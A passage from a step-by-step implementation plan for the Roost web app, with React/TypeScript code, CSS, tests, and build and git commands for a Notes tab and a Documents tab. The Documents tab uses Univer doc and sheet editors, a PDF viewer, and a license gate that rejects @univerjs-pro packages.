    notesApi.listNotes(query).then((found) => { setNotes(found); setError(null); }).catch(fail);
  }, [query, fail]);
  useEffect(() => load(), [load, live.boardVersion.notes]);

  const create = useCallback((title?: string) => {
    notesApi.createNote({ title: title ?? "Untitled note", content: title ? `# ${title}\n\n` : "" })
      .then((note) => setOpenId(note.id)).catch(fail);
  }, [fail]);
  const keep = (noteId: string) => { notesApi.keepNote(noteId).then(load).catch(fail); };
  const close = useCallback(() => { setOpenId(null); load(); }, [load]);

  return (
    <section className="notes-board" aria-label="Notes">
      <NotesToolbar search={search} onSearch={setSearch} onSubmit={() => setQuery(search.trim())} onNew={() => create()} />
      {error ? <ErrorNotice message={error} onRetry={load} /> : null}
      {openId
        ? <NoteEditor key={openId} noteId={openId} onClose={close} onOpenNote={setOpenId} onCreateNote={create} />
        : <NotesListArea notes={notes} query={query} onOpen={setOpenId} onKeep={keep} />}
    </section>
  );
}
```

`web/src/styles/notes.css` (import it in `web/src/styles.css` after `board.css`):

```css
/* The Board's Notes tab (M2 D4): search, list, editor with preview, [[link]] chips. */
.notes-board { display: flex; flex-direction: column; gap: 16px; }
.notes-toolbar { display: flex; flex-wrap: wrap; gap: 8px; }
.notes-toolbar input[type="search"] {
  flex: 1 1 220px; min-width: 0; padding: 8px 12px; border: 1px solid var(--line);
  border-radius: var(--radius-md); background: var(--surface); color: var(--text); font: inherit;
}
.note-list { display: flex; flex-direction: column; gap: 8px; margin: 0; padding: 0; list-style: none; }
.note-row { padding: 12px 16px; border: 1px solid var(--line); border-radius: var(--radius-md); background: var(--surface); }
.note-row__open {
  display: flex; flex-direction: column; gap: 4px; width: 100%; padding: 0; border: 0;
  background: none; color: inherit; font: inherit; text-align: left; cursor: pointer;
}
.note-row__title { font-weight: 600; }
.note-row__snippet { color: var(--muted); font-size: var(--fs-sm); overflow-wrap: anywhere; }
.note-row__chips { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; margin-top: 8px; }
.note-row__when { color: var(--faint); font-size: var(--fs-xs); }
.note-editor { display: flex; flex-direction: column; gap: 12px; }
.note-editor__bar { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 8px; }
.note-editor__state { color: var(--muted); font-size: var(--fs-sm); }
.note-editor__modes { display: flex; gap: 4px; }
.note-editor__modes [aria-pressed="true"] { background: var(--emerald-tint); }
.note-editor__title {
  padding: 8px 12px; border: 1px solid var(--line); border-radius: var(--radius-md);
  background: var(--surface); color: var(--text); font: 600 var(--fs-lg) var(--font-display);
}
.note-editor__body {
  min-height: 320px; padding: 12px; border: 1px solid var(--line); border-radius: var(--radius-md);
  background: var(--surface); color: var(--text); font: var(--fs-base)/1.6 var(--font-mono); resize: vertical;
}
.note-preview {
  padding: 12px 16px; border: 1px solid var(--line); border-radius: var(--radius-md);
  background: var(--surface); line-height: 1.6; overflow-wrap: anywhere;
}
.note-preview__image { color: var(--muted); font-style: italic; }
.wikilink-chips { display: flex; flex-wrap: wrap; gap: 6px; margin: 0; padding: 0; list-style: none; }
.wikilink-chip {
  display: inline-flex; align-items: center; padding: 2px 10px; border: 1px solid var(--emerald-edge);
  border-radius: var(--pill); background: var(--emerald-tint); color: var(--text); font: inherit;
  font-size: var(--fs-sm); cursor: pointer;
}
.wikilink-chip--new { border-style: dashed; background: none; color: var(--muted); }
.conflict-notice {
  display: flex; flex-wrap: wrap; align-items: center; gap: 8px; padding: 10px 12px;
  border: 1px solid var(--amber); border-radius: var(--radius-md); background: var(--sunken);
}
.conflict-notice p { flex: 1 1 240px; margin: 0; }
```

- [ ] **Step 8: The Board's Notes tab (lazy)**

In `web/src/components/board/boardTabs.ts`, add `{ id: "notes", label: "Notes" }` after Money in `ORDER`, and update the comment: "Fixed order: Tasks, Money, Notes, Documents".

In `web/src/pages/Board.tsx`:

```tsx
import { lazy, Suspense, useCallback, useEffect, useState, type ComponentType, type LazyExoticComponent, type ReactNode } from "react";
// …existing imports…

// Heavier panels are their own chunks (D4): the main bundle stays small.
const NotesBoard = lazy(() => import("../components/notes/NotesBoard"));

function lazyPanel(Panel: LazyExoticComponent<ComponentType>): () => ReactNode {
  return () => (
    <Suspense fallback={<p className="board-loading">Loading&hellip;</p>}>
      <Panel />
    </Suspense>
  );
}

// One panel per domain role with a Board view.
const BOARD_PANELS: Partial<Record<BoardTab, () => ReactNode>> = {
  tasks: () => <TasksBoard />,
  money: () => <MoneyBoard />,
  notes: lazyPanel(NotesBoard),
};
```

Replace the empty-board paragraph's text with: `Give {liveBot.name} a role with a Board (Tasks, Finance, Notes or Docs) on its Desk page. Your tasks, money, notes and documents are shared by every bot with that role.` Update the `Board` comment to "its Tasks, Money, Notes and Documents views (M1 D8, M2 D4)".

- [ ] **Step 9: Run the tests to see them pass**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost/web && npm test`, then `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_static.py -q`
Expected: PASS, every suite included (MessageRow's tests too: `renderBody` now goes through `linkHost`).

- [ ] **Step 10: Full gates and commit**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest --cov=roost --cov-fail-under=80 -q && (cd web && npm test && npm run build && npm run size)
git -C /Users/blckit/Desktop/Code_Projects/roost add web/package.json web/package-lock.json web/src/api/client.ts \
  web/src/api/conflict.ts web/src/api/notes.ts web/src/api/types.ts web/src/store/live.ts \
  web/src/components/board/ConflictNotice.tsx web/src/components/board/boardTabs.ts web/src/pages/Board.tsx \
  web/src/components/notes/noteHelpers.ts web/src/components/notes/useNoteDraft.ts web/src/components/notes/NotePreview.tsx \
  web/src/components/notes/WikilinkChips.tsx web/src/components/notes/NoteEditor.tsx web/src/components/notes/NoteList.tsx \
  web/src/components/notes/NotesBoard.tsx web/src/styles/notes.css web/src/styles.css \
  web/src/lib/linkHost.ts web/src/components/MessageRow.tsx roost/gateway/routes/static.py roost/constants.py \
  web/tests/conflict.test.ts web/tests/noteText.test.ts web/tests/NoteEditor.test.tsx web/tests/NotesBoard.test.tsx \
  web/tests/live.test.ts web/tests/Board.test.tsx tests/test_static.py
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "feat: web Board Notes tab — search, markdown editor with a safe preview, [[link]] chips, autosave"
```

---

### Task 6: Web — the Board's Documents tab (Univer license fix, lazy editors, PDFs)

Implements **D4**'s Documents tab:
- A list with doc/sheet/pdf kind icons, plus New doc, New sheet, Upload PDF, Keep and Delete.
- Opening a document loads its editor: the Univer doc or sheet editor (autosave with a revision check), or the react-pdf viewer.
- **The license fix (spec §3.1).** Only the individual Apache-2.0 presets `@univerjs/preset-docs-core` and `@univerjs/preset-sheets-core` are installed, never `@univerjs/presets`. A small local `createUniver` replaces the meta package's.
- A license-gate test fails on any `@univerjs-pro` package in `web/package-lock.json`.
- Every editor is code-split, so `npm run size` holds the main bundle within the Task 4 budget.
- Live reloads on `documents_changed`.

**Files:**
- Create: `web/src/api/documents.ts`, `web/src/components/documents/DocumentsBoard.tsx`, `web/src/components/documents/DocumentRow.tsx`, `web/src/components/documents/KindIcon.tsx`, `web/src/components/documents/DocumentOpen.tsx`, `web/src/components/documents/PdfViewer.tsx`, `web/src/components/documents/univer/kit.ts`, `web/src/components/documents/univer/createUniver.ts`, `web/src/components/documents/univer/docKit.ts`, `web/src/components/documents/univer/sheetKit.ts`, `web/src/components/documents/univer/useUniverAutosave.ts`, `web/src/components/documents/univer/UniverEditor.tsx`, `web/src/components/documents/univer/DocEditor.tsx`, `web/src/components/documents/univer/SheetEditor.tsx`, `web/src/styles/documents.css`
- Create tests: `web/tests/licenseGate.ts`, `web/tests/licenseGate.test.ts`, `web/tests/UniverEditor.test.tsx`, `web/tests/PdfViewer.test.tsx`, `web/tests/DocumentsBoard.test.tsx`
- Modify: `web/package.json`, `web/package-lock.json`, `web/src/api/types.ts`, `web/src/store/live.ts`, `web/src/components/board/boardTabs.ts`, `web/src/pages/Board.tsx`, `web/src/styles.css`, `THIRD_PARTY_NOTICES.md`
- Modify tests: `web/tests/live.test.ts`, `web/tests/Board.test.tsx`

**Interfaces:**
- Consumes:
  - Task 2's routes and shapes (`DocumentOut`, `DocumentDetailOut`, the 409 body, `documents_changed`, `/api/documents/{id}/pdf`, the raw PDF upload).
  - Task 5's `apiUpload`, `withConflict`, `RevisionConflictError`, `ConflictNotice`, `relativeTimeAgo` and `lazyPanel`.
  - Task 4's `npm run size`.
- Produces:
  - Documents API: `listDocuments(kind?)`, `getDocument(id)`, `createDocument({kind, title})`, `saveDocument(id, {base_revision, payload?, title?})`, `uploadPdf(file)`, `pdfUrl(id)`, `keepDocument(id)`, `deleteDocument(id)`.
  - Editor plumbing: the `UniverKit` / `MountedEditor` types, `createUniver(locale, locales, presets)`, and `useUniverAutosave(kit, doc, containerRef, onConflict)`.
  - Live store: `boardVersion.documents`.
  - The Board: `BoardTab` gains `"documents"`.

- [ ] **Step 1: Path guard** (as Task 1 Step 1), and the disk guard: `df -g /System/Volumes/Data | awk 'NR==2{print $4}'` ≥ 8.

- [ ] **Step 2: Dependencies — the individual open-source presets only, verified**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost/web && npm install --save-exact @univerjs/core@0.24.0 @univerjs/themes@0.24.0 \
  @univerjs/preset-docs-core@0.24.0 @univerjs/preset-sheets-core@0.24.0 rxjs@7.8.2 react-pdf@10.4.1
npm ls @univerjs/presets              # (empty) — the meta package is NOT installed
node -e 'const p=require("./package-lock.json").packages; console.log(Object.keys(p).filter(k=>/@univerjs-pro\//.test(k)).length, "@univerjs-pro packages")'   # 0
node -e '
const { execSync } = require("node:child_process");
const before = JSON.parse(execSync("git show HEAD:web/package-lock.json", { encoding: "utf8", maxBuffer: 1e9 })).packages;
const after = require("./package-lock.json").packages;
const added = Object.entries(after).filter(([path]) => path && !(path in before));
const counts = {};
for (const [, meta] of added) counts[meta.license ?? "NO LICENSE FIELD"] = (counts[meta.license ?? "NO LICENSE FIELD"] ?? 0) + 1;
console.log(added.length, "new packages", JSON.stringify(counts));
for (const [path, meta] of added) if (!/^(MIT|ISC|Apache-2\.0|BSD-2-Clause|BSD-3-Clause|0BSD|MPL-2\.0|BlueOak-1\.0\.0)$/.test(meta.license ?? "")) console.log("CHECK", path, meta.license);'
head -3 node_modules/@univerjs/telemetry/LICENSE   # "Apache License / Version 2.0"
```

Expected:
- There are 0 `@univerjs-pro` packages, and `npm ls @univerjs/presets` is empty.
- Exactly one `CHECK` line appears: `node_modules/@univerjs/telemetry` with no license field. That is Univer's telemetry interface, a dependency of `@univerjs/sheets-ui`. Its `LICENSE` file is Apache-2.0, and `web/tests/licenseGate.ts` records it as a reviewed entry (spec §10.1).
- If any **other** `CHECK` line appears (a GPL/AGPL/SSPL/unknown license, or another package with no license field), stop and report it.

- [ ] **Step 3: Write the failing tests**

`web/tests/licenseGate.ts`:

```ts
// The web license gate (spec §3.1, §10.1; M2 D4). Univer's paid line never
// ships: the @univerjs/presets meta package pulls in @univerjs-pro/* (no
// license field), so Roost installs the individual open-source presets only.
export interface LockFile {
  packages?: Record<string, { license?: string }>;
}

// Packages whose package.json has no license field, each reviewed by hand.
export const REVIEWED_NO_LICENSE_FIELD: Readonly<Record<string, string>> = {
  "node_modules/@univerjs/telemetry":
    "Apache-2.0: its LICENSE file and source headers (DreamNum Co., Ltd.); a dependency of @univerjs/sheets-ui. Reviewed 2026-10-14.",
};

function pathsMatching(lock: LockFile, pattern: RegExp): string[] {
  return Object.keys(lock.packages ?? {}).filter((path) => pattern.test(path)).sort();
}

export function proPackages(lock: LockFile): string[] {
  return pathsMatching(lock, /(^|\/)node_modules\/@univerjs-pro\//);
}

export function metaPresets(lock: LockFile): string[] {
  return pathsMatching(lock, /(^|\/)node_modules\/@univerjs\/presets$/);
}

export function unreviewedWithoutLicense(lock: LockFile): string[] {
  return Object.entries(lock.packages ?? {})
    .filter(([path, meta]) => path !== "" && !meta.license && !(path in REVIEWED_NO_LICENSE_FIELD))
    .map(([path]) => path)
    .sort();
}
```

`web/tests/licenseGate.test.ts`:

```ts
// @vitest-environment node
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { metaPresets, proPackages, unreviewedWithoutLicense, type LockFile } from "./licenseGate";

const lock = JSON.parse(readFileSync(new URL("../package-lock.json", import.meta.url), "utf8")) as LockFile;

describe("license gate (spec §3.1)", () => {
  it("installs no @univerjs-pro package and not the @univerjs/presets meta package", () => {
    expect(proPackages(lock)).toEqual([]);
    expect(metaPresets(lock)).toEqual([]);
  });

  it("fails on a test @univerjs-pro package, nested or not", () => {
    const bad: LockFile = { packages: {
      "": {},
      "node_modules/@univerjs-pro/license": { license: "UNLICENSED" },
      "node_modules/@univerjs/x/node_modules/@univerjs-pro/collaboration": {},
      "node_modules/@univerjs/core": { license: "Apache-2.0" },
    } };
    expect(proPackages(bad)).toEqual([
      "node_modules/@univerjs-pro/license", "node_modules/@univerjs/x/node_modules/@univerjs-pro/collaboration",
    ]);
    expect(metaPresets({ packages: { "node_modules/@univerjs/presets": { license: "Apache-2.0" } } }))
      .toEqual(["node_modules/@univerjs/presets"]);
  });

  it("every installed package names its license or has a reviewed entry", () => {
    expect(unreviewedWithoutLicense(lock)).toEqual([]);
    expect(unreviewedWithoutLicense({ packages: { "node_modules/mystery": {} } })).toEqual(["node_modules/mystery"]);
  });
});
```

`web/tests/UniverEditor.test.tsx`:

```tsx
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { UniverEditor } from "../src/components/documents/univer/UniverEditor";
import { DOCUMENT_AUTOSAVE_MS } from "../src/components/documents/univer/useUniverAutosave";
import type { UniverKit } from "../src/components/documents/univer/kit";
import { RevisionConflictError } from "../src/api/conflict";
import type { DocumentDetailOut, DocumentOut } from "../src/api/types";

const saveDocumentMock = vi.fn();
vi.mock("../src/api/documents", () => ({ saveDocument: (...a: unknown[]) => saveDocumentMock(...a) }));

type Snapshot = Record<string, unknown>;
interface Mount { payload: Snapshot; change: () => void; disposed: boolean }

// A stand-in for Univer: the "editor" holds one snapshot the test edits.
function fakeKit() {
  const mounts: Mount[] = [];
  let current: Snapshot | null = null;
  const kit: UniverKit = {
    mount(_container, payload, onChange) {
      const mount: Mount = { payload, change: onChange, disposed: false };
      mounts.push(mount);
      current = payload;
      return { snapshot: () => current, dispose: () => { mount.disposed = true; } };
    },
  };
  const edit = (next: Snapshot) => {
    current = next;
    mounts[mounts.length - 1].change();
  };
  return { kit, mounts, edit };
}

function detail(overrides: Partial<DocumentDetailOut> = {}): DocumentDetailOut {
  return {
    id: "d1", kind: "doc", title: "My tasks", pages: null, revision: 1, created_at: "x", updated_at: "x",
    created_by_bot: null, tainted: false, payload: { body: { dataStream: "a\r\n" } }, ...overrides,
  };
}

function meta(revision: number): DocumentOut {
  const { payload: _payload, ...rest } = detail({ revision });
  return rest;
}

const mine = { body: { dataStream: "mine\r\n" } };
const pause = () => act(async () => { await vi.advanceTimersByTimeAsync(DOCUMENT_AUTOSAVE_MS + 10); });

beforeEach(() => {
  vi.useFakeTimers({ shouldAdvanceTime: true });
  saveDocumentMock.mockReset();
});
afterEach(() => {
  cleanup();
  vi.useRealTimers();
});

describe("UniverEditor", () => {
  it("saves an edit after a pause, against the revision it opened", async () => {
    saveDocumentMock.mockResolvedValue(meta(2));
    const fake = fakeKit();
    render(<UniverEditor kit={fake.kit} document={detail()} />);
    expect(fake.mounts[0].payload).toEqual({ body: { dataStream: "a\r\n" } });
    act(() => fake.edit(mine));
    await pause();
    expect(saveDocumentMock).toHaveBeenCalledWith("d1", { payload: mine, base_revision: 1 });
    expect(await screen.findByText("Saved")).toBeInTheDocument();
  });

  it("never sends an unchanged snapshot, and saves a pending edit when closed", async () => {
    saveDocumentMock.mockResolvedValue(meta(2));
    const fake = fakeKit();
    const { unmount } = render(<UniverEditor kit={fake.kit} document={detail()} />);
    act(() => fake.mounts[0].change());   // e.g. a selection change: the same snapshot
    await pause();
    expect(saveDocumentMock).not.toHaveBeenCalled();
    act(() => fake.edit(mine));
    unmount();
    expect(saveDocumentMock).toHaveBeenCalledWith("d1", { payload: mine, base_revision: 1 });
    expect(fake.mounts[0].disposed).toBe(true);
  });

  it("on a stale revision, Load the latest remounts their copy and saves nothing of mine", async () => {
    const theirs = detail({ revision: 3, payload: { body: { dataStream: "theirs\r\n" } } });
    saveDocumentMock.mockRejectedValueOnce(new RevisionConflictError(theirs));
    const fake = fakeKit();
    const user = userEvent.setup({ advanceTimers: vi.advanceTimersByTime });
    render(<UniverEditor kit={fake.kit} document={detail()} />);
    act(() => fake.edit(mine));
    await pause();
    await user.click(await screen.findByRole("button", { name: "Load the latest" }));
    expect(fake.mounts).toHaveLength(2);
    expect(fake.mounts[1].payload).toEqual({ body: { dataStream: "theirs\r\n" } });
    expect(saveDocumentMock).toHaveBeenCalledTimes(1);
  });

  it("on a stale revision, Keep mine saves my copy over the latest revision", async () => {
    saveDocumentMock.mockRejectedValueOnce(new RevisionConflictError(detail({ revision: 3 }))).mockResolvedValue(meta(4));
    const fake = fakeKit();
    const user = userEvent.setup({ advanceTimers: vi.advanceTimersByTime });
    render(<UniverEditor kit={fake.kit} document={detail()} />);
    act(() => fake.edit(mine));
    await pause();
    await user.click(await screen.findByRole("button", { name: "Keep mine" }));
    expect(saveDocumentMock).toHaveBeenLastCalledWith("d1", { payload: mine, base_revision: 3 });
    expect(fake.mounts).toHaveLength(1);
  });
});
```

`web/tests/PdfViewer.test.tsx`:

```tsx
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import PdfViewer from "../src/components/documents/PdfViewer";

vi.mock("react-pdf", async () => {
  const { useEffect } = await import("react");
  return {
    pdfjs: { GlobalWorkerOptions: { workerSrc: "" } },
    Document: ({ file, onLoadSuccess, children }: { file: string; onLoadSuccess: (pdf: { numPages: number }) => void; children: unknown }) => {
      useEffect(() => onLoadSuccess({ numPages: 2 }), [onLoadSuccess]);
      return <div data-testid="pdf-document" data-file={file}>{children as never}</div>;
    },
    Page: ({ pageNumber }: { pageNumber: number }) => <p>page {pageNumber}</p>,
  };
});

afterEach(() => cleanup());

describe("PdfViewer", () => {
  it("shows the PDF one page at a time", async () => {
    const user = userEvent.setup();
    render(<PdfViewer url="/api/documents/p1/pdf" title="Lease" />);
    expect(await screen.findByText("page 1")).toBeInTheDocument();
    expect(screen.getByTestId("pdf-document")).toHaveAttribute("data-file", "/api/documents/p1/pdf");
    await user.click(screen.getByRole("button", { name: "Next page" }));
    expect(screen.getByText("page 2")).toBeInTheDocument();
    expect(screen.getByText("Page 2 of 2")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Next page" })).toBeDisabled();
  });
});
```

`web/tests/DocumentsBoard.test.tsx`:

```tsx
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import DocumentsBoard from "../src/components/documents/DocumentsBoard";
import type { DocumentOut } from "../src/api/types";

const listDocumentsMock = vi.fn();
const getDocumentMock = vi.fn();
const createDocumentMock = vi.fn();
const uploadPdfMock = vi.fn();
const keepDocumentMock = vi.fn();
const deleteDocumentMock = vi.fn();
vi.mock("../src/api/documents", () => ({
  listDocuments: (...a: unknown[]) => listDocumentsMock(...a),
  getDocument: (...a: unknown[]) => getDocumentMock(...a),
  createDocument: (...a: unknown[]) => createDocumentMock(...a),
  uploadPdf: (...a: unknown[]) => uploadPdfMock(...a),
  keepDocument: (...a: unknown[]) => keepDocumentMock(...a),
  deleteDocument: (...a: unknown[]) => deleteDocumentMock(...a),
  pdfUrl: (id: string) => `/api/documents/${id}/pdf`,
}));
vi.mock("../src/components/documents/univer/DocEditor", () => ({
  default: ({ document }: { document: { title: string } }) => <p>doc editor for {document.title}</p>,
}));
vi.mock("../src/components/documents/univer/SheetEditor", () => ({
  default: ({ document }: { document: { title: string } }) => <p>sheet editor for {document.title}</p>,
}));
vi.mock("../src/components/documents/PdfViewer", () => ({ default: ({ url }: { url: string }) => <p>pdf viewer {url}</p> }));
let live = { boardVersion: { tasks: 0, money: 0, notes: 0, documents: 0 } };
vi.mock("../src/hooks/useLiveStore", () => ({ useLiveState: () => live }));

function meta(overrides: Partial<DocumentOut> = {}): DocumentOut {
  return {
    id: "d1", kind: "doc", title: "My tasks", pages: null, revision: 1, created_at: "2026-10-14T08:00:00Z",
    updated_at: "2026-10-14T08:00:00Z", created_by_bot: "b1", tainted: false, ...overrides,
  };
}

const DOCS = [
  meta(), meta({ id: "s1", kind: "sheet", title: "October expenses" }),
  meta({ id: "p1", kind: "pdf", title: "Lease", pages: 3, tainted: true }),
];

beforeEach(() => {
  live = { boardVersion: { tasks: 0, money: 0, notes: 0, documents: 0 } };
  for (const mock of [listDocumentsMock, getDocumentMock, createDocumentMock, uploadPdfMock, keepDocumentMock,
    deleteDocumentMock]) mock.mockReset();
  listDocumentsMock.mockResolvedValue(DOCS);
  getDocumentMock.mockImplementation(async (id: string) => ({
    ...DOCS.find((doc) => doc.id === id), payload: id === "p1" ? null : {},
  }));
});
afterEach(() => cleanup());

const rowOf = async (title: string) => (await screen.findByRole("button", { name: title })).closest("li") as HTMLElement;

describe("DocumentsBoard", () => {
  it("lists documents with their kind and marks an uploaded PDF as web content", async () => {
    render(<DocumentsBoard />);
    expect(within(await rowOf("My tasks")).getByRole("img", { name: "Doc" })).toBeInTheDocument();
    expect(within(await rowOf("October expenses")).getByRole("img", { name: "Sheet" })).toBeInTheDocument();
    const lease = await rowOf("Lease");
    expect(within(lease).getByRole("img", { name: "PDF" })).toBeInTheDocument();
    expect(within(lease).getByText("from web content")).toBeInTheDocument();
  });

  it("opens a doc in the doc editor and goes back to the list", async () => {
    const user = userEvent.setup();
    render(<DocumentsBoard />);
    await user.click(await screen.findByRole("button", { name: "My tasks" }));
    expect(await screen.findByText("doc editor for My tasks")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "← Documents" }));
    expect(await screen.findByRole("button", { name: "Lease" })).toBeInTheDocument();
  });

  it("opens a sheet in the sheet editor and a PDF in the viewer", async () => {
    const user = userEvent.setup();
    render(<DocumentsBoard />);
    await user.click(await screen.findByRole("button", { name: "October expenses" }));
    expect(await screen.findByText("sheet editor for October expenses")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "← Documents" }));
    await user.click(await screen.findByRole("button", { name: "Lease" }));
    expect(await screen.findByText("pdf viewer /api/documents/p1/pdf")).toBeInTheDocument();
  });

  it("New sheet creates one and opens it", async () => {
    const created = meta({ id: "s2", kind: "sheet", title: "Untitled sheet" });
    createDocumentMock.mockResolvedValue(created);
    getDocumentMock.mockResolvedValue({ ...created, payload: {} });
    const user = userEvent.setup();
    render(<DocumentsBoard />);
    await user.click(await screen.findByRole("button", { name: "New sheet" }));
    expect(createDocumentMock).toHaveBeenCalledWith({ kind: "sheet", title: "Untitled sheet" });
    expect(await screen.findByText("sheet editor for Untitled sheet")).toBeInTheDocument();
  });

  it("uploads a PDF file and opens it", async () => {
    const uploaded = meta({ id: "p2", kind: "pdf", title: "Scan", tainted: true });
    uploadPdfMock.mockResolvedValue(uploaded);
    getDocumentMock.mockResolvedValue({ ...uploaded, payload: null });
    render(<DocumentsBoard />);
    await screen.findByRole("button", { name: "Lease" });
    const file = new File(["%PDF-1.4"], "Scan.pdf", { type: "application/pdf" });
    fireEvent.change(screen.getByLabelText("PDF file"), { target: { files: [file] } });
    await waitFor(() => expect(uploadPdfMock).toHaveBeenCalledWith(file));
    expect(await screen.findByText("pdf viewer /api/documents/p2/pdf")).toBeInTheDocument();
  });

  it("deletes only after you confirm, and Keep vouches for a web-made one", async () => {
    deleteDocumentMock.mockResolvedValue(undefined);
    keepDocumentMock.mockResolvedValue(meta({ id: "p1", tainted: false }));
    const user = userEvent.setup();
    render(<DocumentsBoard />);
    await user.click(within(await rowOf("My tasks")).getByRole("button", { name: "Delete My tasks" }));
    expect(deleteDocumentMock).not.toHaveBeenCalled();
    await user.click(screen.getByRole("button", { name: "Delete My tasks for good" }));
    expect(deleteDocumentMock).toHaveBeenCalledWith("d1");
    await user.click(within(await rowOf("Lease")).getByRole("button", { name: "Keep Lease as yours" }));
    expect(keepDocumentMock).toHaveBeenCalledWith("p1");
  });

  it("reloads when a documents_changed frame arrives", async () => {
    const { rerender } = render(<DocumentsBoard />);
    await screen.findByRole("button", { name: "Lease" });
    live = { boardVersion: { tasks: 0, money: 0, notes: 0, documents: 1 } };
    rerender(<DocumentsBoard />);
    await waitFor(() => expect(listDocumentsMock).toHaveBeenCalledTimes(2));
  });
});
```

In `web/tests/live.test.ts`: every `boardVersion` expectation gains `documents: 0`, and add:

```ts
  it("counts documents_changed frames so the Documents tab can reload", () => {
    const next = applyFrame(initialLiveState(), {
      type: "documents_changed", seq: 8, change: "created", document_id: "d1", kind: "doc",
    });
    expect(next.boardVersion.documents).toBe(1);
  });
```

In `web/tests/Board.test.tsx`:
- Add `DOCS_ROLE` (`{ id: "docs", name: "Docs", description: "Keeps your documents.", tools: [], board_tab: "documents" as const, needs_desk: false }`) to the `vi.hoisted` block and to the `listRoles` list.
- Add `vi.mock("../src/components/documents/DocumentsBoard", () => ({ default: () => <p>the documents board</p> }));`.
- Add:

```tsx
  it("shows Notes then Documents for a Writer bot, the documents panel loaded lazily", async () => {
    getBotMock.mockResolvedValue(makeBot({ roles: ["docs", "notes"] }));
    const user = userEvent.setup();
    renderBoard();
    const tabs = await screen.findAllByRole("tab");
    expect(tabs.map((tab) => tab.textContent)).toEqual(["Notes", "Documents"]);
    await user.click(screen.getByRole("tab", { name: "Documents" }));
    expect(await screen.findByText("the documents board")).toBeInTheDocument();
  });
```

- [ ] **Step 4: Run them to see them fail**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost/web && npx vitest run tests/licenseGate.test.ts tests/UniverEditor.test.tsx tests/PdfViewer.test.tsx tests/DocumentsBoard.test.tsx tests/live.test.ts tests/Board.test.tsx`
Expected:
- `licenseGate.test.ts` already PASSES. The lock was clean from Step 2's install, and its "fails on a test @univerjs-pro package" case proves the gate bites.
- The other suites FAIL with unresolved imports (`UniverEditor`, `useUniverAutosave`, `PdfViewer`, `DocumentsBoard`), a missing `documents` counter and no Documents tab.

- [ ] **Step 5: API, types, live store**

In `web/src/api/types.ts`: `export type BoardTab = "tasks" | "money" | "notes" | "documents";` and add:

```ts
// The user's documents (M2 D2/D4): one record per doc, sheet or PDF.
export type DocumentKind = "doc" | "sheet" | "pdf";

export interface DocumentOut {
  id: string;
  kind: DocumentKind;
  title: string;
  pages: number | null;
  revision: number;
  created_at: string;
  updated_at: string;
  created_by_bot: string | null;
  tainted: boolean;
}

export interface DocumentDetailOut extends DocumentOut {
  payload: Record<string, unknown> | null; // the Univer snapshot; null for a PDF
}

export interface DocumentsChangedFrame {
  type: "documents_changed";
  seq: number;
  change: "created" | "updated" | "deleted";
  document_id: string;
  kind: DocumentKind;
}
```

Add `| DocumentsChangedFrame` to `ServerFrame`.

In `web/src/store/live.ts`:
- `boardVersion` gains `documents` (initially 0), and the header comment lists `documents_changed`.
- Add:

```ts
    case "documents_changed":
      return { ...state, cursor: frame.seq, boardVersion: { ...state.boardVersion, documents: state.boardVersion.documents + 1 } };
```

`web/src/api/documents.ts`:

```ts
import { apiRequest, apiUpload } from "./client";
import { withConflict } from "./conflict";
import type { DocumentDetailOut, DocumentKind, DocumentOut } from "./types";

// The user's documents (M2 D2/D4): the same records every docs-role bot works on.

const MAX_DOCUMENT_TITLE_LENGTH = 120; // roost/constants.py

export interface DocumentSaveIn {
  base_revision: number;
  payload?: Record<string, unknown>;
  title?: string;
}

const path = (documentId: string) => `/api/documents/${encodeURIComponent(documentId)}`;

export function listDocuments(kind?: DocumentKind): Promise<DocumentOut[]> {
  return apiRequest<DocumentOut[]>("GET", kind ? `/api/documents?kind=${kind}` : "/api/documents");
}

export function getDocument(documentId: string): Promise<DocumentDetailOut> {
  return apiRequest<DocumentDetailOut>("GET", path(documentId));
}

export function createDocument(input: { kind: "doc" | "sheet"; title: string }): Promise<DocumentOut> {
  return apiRequest<DocumentOut>("POST", "/api/documents", input);
}

// A stale base_revision throws RevisionConflictError<DocumentDetailOut> carrying the stored copy.
export function saveDocument(documentId: string, input: DocumentSaveIn): Promise<DocumentOut> {
  return withConflict<DocumentOut, DocumentDetailOut>(apiRequest<DocumentOut>("PUT", path(documentId), input));
}

// An uploaded PDF is outside content: it arrives marked "from web content" until Kept.
export function uploadPdf(file: File): Promise<DocumentOut> {
  const title = (file.name.replace(/\.pdf$/i, "").trim() || "Untitled PDF").slice(0, MAX_DOCUMENT_TITLE_LENGTH);
  return apiUpload<DocumentOut>(`/api/documents/pdf?title=${encodeURIComponent(title)}`, file, "application/pdf");
}

export function pdfUrl(documentId: string): string {
  return `${path(documentId)}/pdf`;
}

// Keep: the user vouches for a web-made or uploaded document (only here — no bot can).
export function keepDocument(documentId: string): Promise<DocumentOut> {
  return apiRequest<DocumentOut>("POST", `${path(documentId)}/keep`);
}

export function deleteDocument(documentId: string): Promise<void> {
  return apiRequest<void>("DELETE", path(documentId));
}
```

- [ ] **Step 6: The Univer editors (the license fix)**

`web/src/components/documents/univer/kit.ts`:

```ts
// What a Univer editor needs from its document kind (M2 D4): mount a snapshot
// into a container and report edits, read the current snapshot back, tear
// down. UniverEditor's tests hand it a fake kit, so they never load Univer.
export interface MountedEditor {
  snapshot(): Record<string, unknown> | null;
  dispose(): void;
}

export interface UniverKit {
  mount(container: HTMLElement, payload: Record<string, unknown>, onChange: () => void): MountedEditor;
}
```

`web/src/components/documents/univer/createUniver.ts`:

```ts
